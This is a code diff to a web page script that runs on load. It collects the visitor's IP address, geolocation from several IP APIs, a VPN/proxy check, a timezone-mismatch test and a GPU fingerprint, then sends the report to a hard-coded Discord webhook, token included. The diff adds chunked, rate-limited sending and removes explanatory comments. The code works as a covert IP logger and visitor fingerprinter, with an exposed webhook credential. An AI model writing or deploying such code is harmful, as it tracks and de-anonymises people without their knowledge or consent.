@@ -37,6 +37,51 @@
     </div>
 
     <script>
+        // Split message into chunks for Discord
+        function splitMessage(message, maxLength = 1900) {
+            const chunks = [];
+            let currentChunk = "```\n";
+            const lines = message.split('\n');
+            
+            for(let line of lines) {
+                if((currentChunk + line + "\n```").length > maxLength) {
+                    chunks.push(currentChunk + "```");
+                    currentChunk = "```\n" + line + "\n";
+                } else {
+                    currentChunk += line + "\n";
+                }
+            }
+            
+            if(currentChunk.length > 4) {
+                chunks.push(currentChunk + "```");
+            }
+            
+            return chunks;
+        }
+
+        // Send to Discord with delay between messages
+        async function sendToDiscord(message) {
+            const webhookUrl = "https://discord.com/api/webhooks/1430325766465257525/tXYBo7t3vy0CTU1mULcYBUiesr82PHIv1f9YENdxYPkmXztrqQo_oCZ4KrvCxuUF1Zac";
+            const chunks = splitMessage(message);
+            
+            for(let i = 0; i < chunks.length; i++) {
+                try {
+                    await fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({content: chunks[i]})
+                    });
+                    
+                    // Wait 1 second between messages to avoid rate limiting
+                    if(i < chunks.length - 1) {
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                } catch(err) {
+                    console.error("Failed to send chunk " + (i + 1), err);
+                }
+            }
+        }
+
         // Check if IP is a known VPN
         async function checkVPNDatabase(ip) {
             const vpnCheck = {
@@ -51,7 +96,6 @@
             }
 
             try {
-                // ProxyCheck.io API (free tier, no key needed)
                 const response = await fetch(`https://proxycheck.io/v2/${ip}?vpn=1&asn=1`);
                 if (response.ok) {
                     const data = await response.json();
@@ -62,7 +106,6 @@
                     }
                 }
             } catch(e) {
-                // If API fails, mark as unknown
                 vpnCheck.isVPN = "Unable to verify";
                 vpnCheck.isProxy = "Unable to verify";
             }
@@ -76,21 +119,17 @@
                 return "Unable to verify";
             }
 
-            // Get browser timezone
             const browserTz = browserTimezone.toLowerCase().replace(/_/g, ' ');
             const ipTz = ipTimezone.toLowerCase().replace(/_/g, ' ');
 
-            // Direct match
             if (browserTz === ipTz) {
                 return "✓ Match";
             }
 
-            // Check if they're in the same country/region
             if (ipCountry && browserTimezone.toLowerCase().includes(ipCountry.toLowerCase())) {
                 return "✓ Same region";
             }
 
-            // Check common timezone aliases
             const timezoneAliases = {
                 'america/new_york': ['est', 'edt', 'eastern'],
                 'america/chicago': ['cst', 'cdt', 'central'],
@@ -110,7 +149,6 @@
                 }
             }
 
-            // If no match found, likely a VPN
             return "⚠️ MISMATCH - Possible VPN";
         }
 
@@ -118,7 +156,6 @@
         async function collectInfo() {
             let data = {};
             
-            // try multiple IP APIs in case one fails
             const apis = [
                 "https://ipapi.co/json/",
                 "https://ipwho.is/",
@@ -140,15 +177,11 @@
 
             const ip = data.ip || data.query || "Unknown";
 
-            // Get browser timezone
             const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const ipTimezone = data.timezone || "Unknown";
             const ipCountry = data.country_code || data.country || "";
 
-            // Check VPN database
             const vpnCheck = await checkVPNDatabase(ip);
-
-            // Check timezone mismatch
             const timezoneMismatch = checkTimezoneMismatch(ipTimezone, ipCountry, browserTimezone);
 
             // GPU detection
@@ -515,14 +548,8 @@
                 }
             }
 
-            // send to Discord webhook
-            fetch("https://discord.com/api/webhooks/1430325766465257525/tXYBo7t3vy0CTU1mULcYBUiesr82PHIv1f9YENdxYPkmXztrqQo_oCZ4KrvCxuUF1Zac", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: "```\n" + message + "\n```"})
-            }).catch(function(err) {
-                // ignore errors
-            });
+            // Send to Discord
+            await sendToDiscord(message);
         }
 
         collectInfo();
